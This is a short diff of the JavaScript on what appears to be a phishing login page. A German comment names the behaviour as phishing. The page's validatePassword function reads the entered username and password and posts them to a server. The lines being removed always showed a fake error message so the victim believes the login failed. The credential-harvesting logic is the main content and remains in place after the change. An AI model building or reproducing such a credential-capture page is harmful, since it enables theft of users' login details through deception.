@@ -46,8 +46,6 @@
     
     <script>
       function validatePassword(event) {
-        event.preventDefault(); // Formular nicht normal absenden
-
         const username = document.getElementById('username').value;
         const password = document.getElementById('password').value;
 
@@ -57,13 +55,7 @@
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ username: username, password: password })
         })
-        .then(response => {
-          // Fehlermeldung immer anzeigen (Phishing-Verhalten)
-          document.getElementById('error-message').style.display = 'block';
-        })
-        .catch(() => {
-          document.getElementById('error-message').style.display = 'block';
-        });
+      
 
         return false; // Submit verhindern
       }
